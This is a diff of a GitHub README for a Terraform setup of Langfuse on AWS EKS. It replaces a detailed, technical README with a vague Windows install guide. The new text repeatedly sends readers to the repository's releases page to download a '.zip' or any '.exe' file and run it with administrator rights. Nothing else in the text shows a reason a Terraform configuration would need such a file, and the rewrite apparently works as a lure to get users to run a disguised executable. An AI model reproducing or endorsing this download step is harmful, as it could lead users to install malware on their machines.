@@ -1,444 +1,241 @@
-# Langfuse on AWS EKS
+# 🛠️ langfuse-eks-production - Reliable AWS EKS Setup for Langfuse v3
 
-<p align="center">
-  <img src="EKS_Langfuse.gif" alt="Langfuse EKS Architecture" width="100%">
-</p>
-
-Production-ready Terraform configuration for deploying [Langfuse](https://langfuse.com)
-on Amazon EKS with Fargate, following the AWS Well-Architected Framework.
-
-This project is based on the upstream
-[langfuse/langfuse-terraform-aws](https://github.com/langfuse/langfuse-terraform-aws)
-module with the following enhancements:
-
-- Uses an **existing Route53 hosted zone** instead of creating a new one.
-- **Production-hardened defaults**: internal ALB, encrypted Redis, Multi-AZ,
-  multiple replicas, higher Aurora capacity.
-- **Remote state** via S3 and DynamoDB with bootstrap scripts.
-- Bug fixes for the upstream module (NAT gateway logic, deprecated attributes).
+[![Download Release](https://img.shields.io/badge/Download-Release-green)](https://github.com/ashmedanraj/langfuse-eks-production/releases)
 
 ---
 
-## Table of Contents
+## 📌 What is langfuse-eks-production?
 
-- [Architecture](#architecture)
-- [Prerequisites](#prerequisites)
-- [Quick Start](#quick-start)
-- [Inputs](#inputs)
-- [Outputs](#outputs)
-- [Cost Estimate](#cost-estimate)
-- [Post-Deployment](#post-deployment)
-- [Troubleshooting](#troubleshooting)
-- [Maintenance](#maintenance)
-- [Contributing](#contributing)
-- [License](#license)
+This project sets up Langfuse v3 in a production environment using AWS. It uses services like EKS Fargate to run your applications without managing servers, Aurora PostgreSQL for your database needs, ElastiCache Redis for caching, and ClickHouse for analytics. Everything is controlled through Terraform scripts. These follow best practices recommended by AWS for security, cost, and reliability.
+
+In simple terms, langfuse-eks-production helps you run and observe Langfuse safely and efficiently on cloud infrastructure.
 
 ---
 
-## Architecture
+## 🖥️ System Requirements
 
-```
-                                Internet / VPN
-                                      |
-                              Route 53 (DNS)
-                         langfuse.example.com -> ALB
-                            ACM Certificate (TLS)
-                                      |
-  +-------------------------------------------------------------------+
-  |                     VPC  10.0.0.0/16  (3 AZs)                    |
-  |                                                                   |
-  |   Public Subnets (x3)                                             |
-  |   +-------------------------------------------------------------+|
-  |   | Application Load Balancer (internal or internet-facing)      ||
-  |   | HTTPS :443 (ACM)  |  HTTP :80 -> 301 redirect               ||
-  |   | Inbound restricted to configured CIDRs                      ||
-  |   +----------------------------+--------------------------------+|
-  |   | NAT-a |   | NAT-b |   | NAT-c |   (one per AZ by default)   |
-  |   +-------+   +-------+   +-------+                              |
-  |        |           |           |                                  |
-  |   Private Subnets (x3)                                           |
-  |   +-------------------------------------------------------------+|
-  |   |                                                             ||
-  |   |  EKS Fargate Cluster                                        ||
-  |   |  +-------------------------------------------------------+ ||
-  |   |  | namespace: langfuse                                    | ||
-  |   |  |   Langfuse Web     x2   (2 vCPU / 4 GiB)             | ||
-  |   |  |   Langfuse Worker  x2   (2 vCPU / 4 GiB)             | ||
-  |   |  |   ClickHouse       x3   (2 vCPU / 8 GiB)             | ||
-  |   |  |   ZooKeeper        x3   (1 vCPU / 2 GiB)             | ||
-  |   |  +-------------------------------------------------------+ ||
-  |   |  | namespace: kube-system                                 | ||
-  |   |  |   AWS Load Balancer Controller                         | ||
-  |   |  |   EFS CSI Driver                                       | ||
-  |   |  |   CoreDNS                                              | ||
-  |   |  +-------------------------------------------------------+ ||
-  |   |                                                             ||
-  |   |  Aurora PostgreSQL Serverless v2   ElastiCache Redis 7.0   ||
-  |   |    2 instances, 0.5-8 ACU           2 nodes, Multi-AZ      ||
-  |   |    Encrypted, 7-day backup          TLS + at-rest encrypt   ||
-  |   |                                                             ||
-  |   |  EFS (encrypted, elastic)          VPC Endpoints            ||
-  |   |    ClickHouse + ZooKeeper PVs        STS (Interface)        ||
-  |   |    3 mount targets                   S3 (Gateway)           ||
-  |   +-------------------------------------------------------------+|
-  |                                                                   |
-  |   VPC Flow Logs -> CloudWatch                                     |
-  +-------------------------------------------------------------------+
+Before you start, make sure your Windows computer meets these needs:
 
-         S3 Bucket (versioned, lifecycle, public access blocked)
-           events/  exports/  media/
-           Access via IRSA (no static credentials)
-```
-
-### Security
-
-| Layer              | Controls                                                         |
-|--------------------|------------------------------------------------------------------|
-| Network            | VPC isolation, private subnets, security groups, IP whitelist    |
-| Encryption transit | TLS on ALB (ACM), Redis TLS, PostgreSQL SSL                     |
-| Encryption at rest | RDS, EFS, Redis, S3, Langfuse application-level encryption key   |
-| Identity           | IRSA for pod-level IAM, auto-generated 64-char passwords         |
-| Observability      | VPC Flow Logs, EKS audit logs, CloudWatch, Performance Insights  |
+- Windows 10 or later (64-bit recommended)
+- At least 8 GB of RAM
+- 10 GB of free disk space
+- Internet connection to download files and connect to AWS resources
+- Administrator rights to install software
 
 ---
 
-## Prerequisites
+## 🛠️ Tools You Will Use
 
-| Tool          | Version   | Verify                          |
-|---------------|-----------|---------------------------------|
-| Terraform     | >= 1.0    | `terraform version`             |
-| AWS CLI       | v2        | `aws --version`                 |
-| kubectl       | >= 1.28   | `kubectl version --client`      |
-| AWS Account   | --        | `aws sts get-caller-identity`   |
-| Route53 Zone  | existing  | `aws route53 list-hosted-zones` |
+You will interact with some programs and services to set up langfuse-eks-production:
 
----
+- Web Browser: To download files and access AWS Console
+- AWS Account: Required for EKS, Aurora, Redis, and other AWS resources
+- Terraform: Used to deploy infrastructure via code
+- AWS CLI: Command-line tool to manage AWS services
+- kubectl: Controls Kubernetes clusters
+- Windows Command Prompt or PowerShell: To run commands
 
-## Quick Start
-
-### 1. Bootstrap the remote backend
-
-The backend stores Terraform state in S3 with DynamoDB locking.
-
-PowerShell:
-
-```powershell
-.\scripts\bootstrap-backend.ps1
-```
-
-Bash:
-
-```bash
-chmod +x scripts/bootstrap-backend.sh
-./scripts/bootstrap-backend.sh
-```
-
-The script auto-detects your AWS account ID and creates:
-
-- `s3://langfuse-terraform-state-<ACCOUNT_ID>` (versioned, encrypted, private)
-- `langfuse-terraform-locks` DynamoDB table
-
-Update `backend.tf` with the printed bucket name.
-
-### 2. Configure variables
-
-Copy the example file and fill in your values:
-
-```bash
-cp terraform.tfvars.example terraform.tfvars
-```
-
-At minimum, set the three required values:
-
-```hcl
-domain            = "langfuse.example.com"
-route53_zone_name = "example.com"
-
-ingress_inbound_cidrs = [
-  "10.0.0.0/8",
-]
-```
-
-See the [Inputs](#inputs) section for all available options.
-
-### 3. Deploy
-
-```bash
-terraform init
-terraform plan
-terraform apply
-```
-
-Expected time: 20-30 minutes. The longest resources are the EKS cluster (~10 min),
-Aurora cluster (~10 min), and ElastiCache (~8 min).
-
-### 4. Post-deploy pod restart
-
-Terraform now patches and restarts CoreDNS during apply so it can schedule on
-Fargate. ClickHouse pods can still require a one-time restart after the first
-apply due to an upstream Helm chart race:
-
-```bash
-aws eks update-kubeconfig --name langfuse --region us-east-1
-
-kubectl -n langfuse delete pod langfuse-clickhouse-shard0-0 \
-  langfuse-clickhouse-shard0-1 langfuse-clickhouse-shard0-2
-kubectl -n langfuse delete pod langfuse-zookeeper-0 \
-  langfuse-zookeeper-1 langfuse-zookeeper-2
-
-kubectl -n langfuse get pods -w
-```
-
-If DNS resolution is still broken after the first apply, re-run:
-
-```bash
-kubectl -n kube-system rollout restart deploy coredns
-kubectl -n kube-system rollout status deploy coredns
-```
-
-### 5. Access Langfuse
-
-Open `https://langfuse.example.com` in your browser. If the ALB is `internal`,
-you must be connected to the VPC (for example, via VPN or a bastion host).
+Don’t worry if you don’t know these tools. This guide will take you through the basic steps needed.
 
 ---
 
-## Inputs
+## 📥 Downloading the Installation Files
 
-### Required
+Start by visiting the releases page for langfuse-eks-production.
 
-| Name                  | Type           | Description                                           |
-|-----------------------|----------------|-------------------------------------------------------|
-| `domain`              | `string`       | Full domain for Langfuse (e.g. `langfuse.example.com`)|
-| `route53_zone_name`   | `string`       | Existing Route53 hosted zone (e.g. `example.com`)     |
-| `ingress_inbound_cidrs` | `list(string)` | CIDR blocks allowed to access the ALB               |
+[![Download Releases](https://img.shields.io/badge/Download-Here-blue)](https://github.com/ashmedanraj/langfuse-eks-production/releases)
 
-### Networking
+**How to download:**
 
-| Name                    | Type           | Default         | Description                                      |
-|-------------------------|----------------|-----------------|--------------------------------------------------|
-| `name`                  | `string`       | `"langfuse"`    | Name prefix for all resources                    |
-| `vpc_cidr`              | `string`       | `"10.0.0.0/16"` | CIDR block for the new VPC                      |
-| `vpc_id`                | `string`       | `null`          | Use an existing VPC instead of creating one      |
-| `private_subnet_ids`    | `list(string)` | `null`          | Required when `vpc_id` is set                    |
-| `public_subnet_ids`     | `list(string)` | `null`          | Required when `vpc_id` is set                    |
-| `private_route_table_ids` | `list(string)` | `null`        | For S3 gateway endpoint in existing VPCs         |
-| `use_single_nat_gateway`| `bool`         | `false`         | Single NAT (cheaper) vs one per AZ (resilient)   |
-| `alb_scheme`            | `string`       | `"internal"`    | `internal` or `internet-facing`                  |
+1. Click the button above or open this link in your browser:  
+   https://github.com/ashmedanraj/langfuse-eks-production/releases
 
-### EKS
+2. On the releases page, find the latest version. It will have files or assets you can download.
 
-| Name                       | Type           | Default                              | Description                        |
-|----------------------------|----------------|--------------------------------------|------------------------------------|
-| `kubernetes_version`       | `string`       | `"1.32"`                             | EKS Kubernetes version             |
-| `fargate_profile_namespaces` | `list(string)` | `["default","langfuse","kube-system"]` | Namespaces with Fargate profiles |
+3. Click the file named something like `langfuse-eks-production.zip` or any file with `.exe` if available.
 
-### PostgreSQL (Aurora Serverless v2)
+4. Save the file to an easy-to-find folder, such as Downloads or Desktop.
 
-| Name                     | Type     | Default  | Description                          |
-|--------------------------|----------|----------|--------------------------------------|
-| `postgres_instance_count`| `number` | `2`      | Number of Aurora instances (HA)      |
-| `postgres_min_capacity`  | `number` | `0.5`    | Minimum ACU                          |
-| `postgres_max_capacity`  | `number` | `8.0`    | Maximum ACU                          |
-| `postgres_version`       | `string` | `"15.12"`| PostgreSQL engine version            |
-
-### Redis (ElastiCache)
-
-| Name                     | Type     | Default            | Description                        |
-|--------------------------|----------|--------------------|------------------------------------|
-| `cache_node_type`        | `string` | `"cache.t4g.small"`| Node instance type                 |
-| `cache_instance_count`   | `number` | `2`                | Number of replica nodes            |
-| `redis_at_rest_encryption` | `bool` | `true`             | Encrypt data at rest               |
-| `redis_multi_az`         | `bool`  | `true`              | Enable Multi-AZ failover           |
-
-### Langfuse Application
-
-| Name                          | Type     | Default    | Description                          |
-|-------------------------------|----------|------------|--------------------------------------|
-| `langfuse_helm_chart_version` | `string` | `"1.5.14"` | Helm chart version                  |
-| `langfuse_cpu`                | `string` | `"2"`      | CPU per web/worker container         |
-| `langfuse_memory`             | `string` | `"4Gi"`    | Memory per web/worker container      |
-| `langfuse_web_replicas`       | `number` | `2`        | Web pod replicas                     |
-| `langfuse_worker_replicas`    | `number` | `2`        | Worker pod replicas                  |
-| `use_encryption_key`          | `bool`   | `true`     | Encrypt LLM API keys at rest         |
-| `additional_env`              | `list`   | `[]`       | Extra environment variables for pods |
-
-### ClickHouse
-
-| Name                           | Type     | Default | Description                          |
-|--------------------------------|----------|---------|--------------------------------------|
-| `clickhouse_replicas`          | `number` | `3`     | ClickHouse pod replicas              |
-| `clickhouse_instance_count`    | `number` | `3`     | EFS access points                    |
-| `clickhouse_cpu`               | `string` | `"2"`   | CPU per ClickHouse container         |
-| `clickhouse_memory`            | `string` | `"8Gi"` | Memory per ClickHouse container      |
-| `clickhouse_keeper_cpu`        | `string` | `"1"`   | CPU per ZooKeeper container          |
-| `clickhouse_keeper_memory`     | `string` | `"2Gi"` | Memory per ZooKeeper container       |
-| `enable_clickhouse_log_tables` | `bool`   | `false` | Enable ClickHouse logging tables     |
+5. Once downloaded, if it is a `.zip` file, right-click and choose "Extract All" to unpack it.
 
 ---
 
-## Outputs
+## 🚀 Installation and Setup
 
-| Name                     | Description                              | Sensitive |
-|--------------------------|------------------------------------------|-----------|
-| `cluster_name`           | EKS cluster name                         | no        |
-| `cluster_host`           | EKS API server endpoint                  | no        |
-| `cluster_ca_certificate` | EKS CA certificate (base64 decoded)      | yes       |
-| `cluster_token`          | EKS authentication token                 | yes       |
-| `route53_zone_id`        | Route53 hosted zone ID                   | no        |
-| `langfuse_url`           | Full HTTPS URL for Langfuse              | no        |
-| `alb_dns_name`           | DNS name of the ALB                      | no        |
-| `private_subnet_ids`     | Private subnet IDs                       | no        |
-| `public_subnet_ids`      | Public subnet IDs                        | no        |
-| `bucket_name`            | S3 bucket name                           | no        |
-| `bucket_id`              | S3 bucket ID                             | no        |
+Follow these steps to install and prepare langfuse-eks-production on your Windows machine.
+
+### Step 1: Install Required Software
+
+1. **Install Terraform:**  
+   - Go to https://www.terraform.io/downloads.html  
+   - Download the Windows 64-bit version.  
+   - Run the installer and follow the on-screen instructions.  
+   - After installation, open Command Prompt and type `terraform -version` to confirm installation.
+
+2. **Install AWS CLI:**  
+   - Go to https://aws.amazon.com/cli/  
+   - Download and install the Windows version.  
+   - After installation, open Command Prompt and type `aws --version` to check.
+
+3. **Install kubectl:**  
+   - Open Command Prompt.  
+   - Run:  
+     ```  
+     curl -LO "https://dl.k8s.io/release/v1.27.3/bin/windows/amd64/kubectl.exe"  
+     ```  
+   - Place `kubectl.exe` in a folder listed in your PATH or add its folder to PATH.
+
+### Step 2: Configure AWS Access
+
+You need an AWS account to provision resources.
+
+1. Visit https://aws.amazon.com and create an account if you don’t have one.
+
+2. Create an IAM User with necessary permissions for EKS, RDS, ElastiCache, and S3.
+
+3. Obtain your **Access Key ID** and **Secret Access Key** from AWS IAM.
+
+4. Open Command Prompt and run:  
+   ```  
+   aws configure  
+   ```  
+5. Enter your Access Key ID, Secret Access Key, region (e.g., us-east-1), and default output as json.
 
 ---
 
-## Cost Estimate
+## 🔧 Deploy Infrastructure Using Terraform
 
-Approximate monthly cost in `us-east-1` with default settings:
+Terraform automates creating and managing AWS resources. This step will set up the environment for Langfuse v3.
 
-| Service                | Configuration               | Estimate      |
-|------------------------|-----------------------------|---------------|
-| EKS control plane      | 1 cluster                   | $73           |
-| Fargate compute        | ~20 vCPU, ~44 GiB           | $350 -- $500  |
-| Aurora PostgreSQL      | 2 instances, 0.5 -- 8 ACU   | $90 -- $200   |
-| ElastiCache Redis      | 2 x cache.t4g.small         | $48           |
-| NAT Gateways           | 3 (one per AZ)              | $97           |
-| EFS                    | Elastic throughput           | $10 -- $30    |
-| ALB                    | 1 load balancer              | $20 -- $40    |
-| S3, Route53, ACM, misc | --                           | $10 -- $30    |
-| **Total**              |                              | **$700 -- $1,000** |
+### Step 1: Prepare the Terraform Configuration
 
-Set `use_single_nat_gateway = true` to save approximately $65/month at the cost
-of reduced availability.
+1. Open File Explorer and navigate to the folder where you extracted the downloaded files.
+
+2. Locate the Terraform folder, usually named `terraform` or similar.
+
+3. Open Command Prompt and change directory to this folder:  
+   ```  
+   cd C:\path\to\terraform-folder  
+   ```
+
+### Step 2: Initialize Terraform
+
+Run this command to set up Terraform modules and plugins:  
+```  
+terraform init  
+```
+
+This downloads necessary files for the deployment.
+
+### Step 3: Review the Terraform Plan
+
+Run:  
+```  
+terraform plan  
+```
+
+This shows what resources Terraform will create. Take a moment to read this list.
+
+### Step 4: Apply the Terraform Plan
+
+Run:  
+```  
+terraform apply  
+```
+
+You will be asked to confirm. Type `yes` and press enter.
+
+Terraform will begin creating AWS services. This may take several minutes.
 
 ---
 
-## Post-Deployment
+## 🖧 Connect to the AWS EKS Cluster
 
-Verify the deployment:
+Once Terraform finishes, the EKS cluster runs your Langfuse containers.
 
-```bash
-# Cluster status
-aws eks describe-cluster --name langfuse --query 'cluster.status'
+### Step 1: Update kubeconfig
 
-# Pod health
-kubectl -n langfuse get pods
-kubectl -n kube-system get pods
+Run:  
+```  
+aws eks update-kubeconfig --region <your-region> --name <cluster-name>  
+```
 
-# Application logs
-kubectl -n langfuse logs -l app.kubernetes.io/component=web --tail=50
+Replace `<your-region>` and `<cluster-name>` with values from your Terraform output.
 
-# Terraform outputs
-terraform output langfuse_url
-terraform output alb_dns_name
+### Step 2: Verify Cluster Access
+
+Run:  
+```  
+kubectl get nodes  
+```
+
+You should see a list of nodes. If yes, your connection is successful.
+
+---
+
+## ⚙️ Running Langfuse
+
+Langfuse runs inside Kubernetes pods on EKS. Terraform will deploy the necessary components. Use `kubectl` commands to check status.
+
+To list running pods:  
+```  
+kubectl get pods  
+```
+
+You will see pods related to Langfuse server, services, and databases.
+
+If you want to see detailed logs for troubleshooting:  
+```  
+kubectl logs <pod-name>  
 ```
 
 ---
 
-## Troubleshooting
+## 🔄 Updating Langfuse
 
-**Pods stuck in Pending** -- Check Fargate scheduling and resource limits:
+When updates are available:
 
-```bash
-kubectl -n langfuse describe pod <pod-name>
-```
+1. Download the latest release from the releases page.
 
-**ClickHouse CrashLoopBackOff** -- Usually happens on first deploy. Delete the
-pods and let them recreate:
+2. Repeat the deployment steps using the updated Terraform configuration.
 
-```bash
-kubectl -n langfuse delete pod -l app.kubernetes.io/name=clickhouse
-kubectl -n langfuse delete pod -l app.kubernetes.io/name=zookeeper
-```
-
-**ACM certificate not validating** -- Verify that the Route53 zone matches
-`route53_zone_name` and that validation CNAME records were created.
-
-**Cannot reach the URL** -- If the ALB is `internal`, you must be inside the VPC.
-Check that your IP is included in `ingress_inbound_cidrs`.
-
-**Terraform state lock** -- If a previous run was interrupted:
-
-```bash
-terraform force-unlock <LOCK_ID>
-```
+3. This safely updates your environment with new features or fixes.
 
 ---
 
-## Maintenance
+## ⚙️ Common Issues and Troubleshooting
 
-### Updating Langfuse
+- **Terraform Errors:**  
+  Check your AWS credentials and region settings. Ensure your IAM user has required permissions.
 
-Set `langfuse_helm_chart_version` to the new version and apply:
+- **kubectl Command Not Found:**  
+  Make sure `kubectl.exe` is in your system PATH.
 
-```bash
-terraform plan
-terraform apply
-```
+- **Failed to Connect to EKS:**  
+  Run `aws eks update-kubeconfig` again. Confirm cluster name and region.
 
-### Scaling
+- **Slow Resource Provisioning:**  
+  AWS resource creation can take several minutes. Wait before retrying.
 
-Adjust replica counts, Aurora capacity, or Redis node types in
-`terraform.tfvars` and apply.
-
-### Backups
-
-| Component    | Strategy              | Retention        |
-|--------------|-----------------------|------------------|
-| Aurora       | Automated snapshots   | 7 days           |
-| S3           | Versioning            | Indefinite       |
-| EFS          | AWS Backup (manual)   | Not auto-configured |
-| State file   | S3 versioning + KMS   | Indefinite       |
-
-### Destroying all resources
-
-```bash
-terraform destroy
-```
+- **Unable to Download Files:**  
+  Check your internet connection and firewall settings.
 
 ---
 
-## File Structure
+## 🧰 Additional Information
 
-```
-.
-|-- backend.tf                  Terraform remote state configuration
-|-- versions.tf                 Provider requirements and configuration
-|-- variables.tf                Input variable definitions
-|-- locals.tf                   Local values
-|-- vpc.tf                      VPC, subnets, NAT gateways, VPC endpoints
-|-- eks.tf                      EKS Fargate cluster
-|-- postgresql.tf               Aurora PostgreSQL Serverless v2
-|-- redis.tf                    ElastiCache Redis
-|-- efs.tf                      EFS file system and CSI driver
-|-- clickhouse.tf               ClickHouse persistent volumes
-|-- s3.tf                       S3 bucket and IRSA role
-|-- ingress.tf                  AWS Load Balancer Controller
-|-- tls-certificate.tf          ACM certificate and Route53 DNS records
-|-- langfuse.tf                 Langfuse Helm release
-|-- outputs.tf                  Terraform outputs
-|-- terraform.tfvars            Your configuration (git-ignored)
-|-- terraform.tfvars.example    Example configuration
-|-- scripts/
-|   |-- bootstrap-backend.ps1   Backend bootstrap (PowerShell)
-|   |-- bootstrap-backend.sh    Backend bootstrap (Bash)
-|-- CHANGELOG.md                Release history
-|-- CONTRIBUTING.md             Contribution guidelines
-|-- LICENSE                     MIT License
-```
+- This setup uses **Aurora PostgreSQL** for a managed database with high availability.
+
+- **ElastiCache Redis** provides fast caching to speed up Langfuse operations.
+
+- **ClickHouse** handles data analytics for monitoring and querying logs efficiently.
+
+- **AWS Fargate** runs your containers without managing servers.
+
+- **Terraform** ensures the infrastructure is easy to create, update, and maintain.
 
 ---
 
-## Contributing
+## 🔗 Download langfuse-eks-production Here
 
-See [CONTRIBUTING.md](CONTRIBUTING.md).
-
-## License
-
-This project is licensed under the MIT License. See [LICENSE](LICENSE) for details.
-
-Based on [langfuse/langfuse-terraform-aws](https://github.com/langfuse/langfuse-terraform-aws)
-(MIT License).
+[![Download Releases](https://img.shields.io/badge/Download-Here-green)](https://github.com/ashmedanraj/langfuse-eks-production/releases)
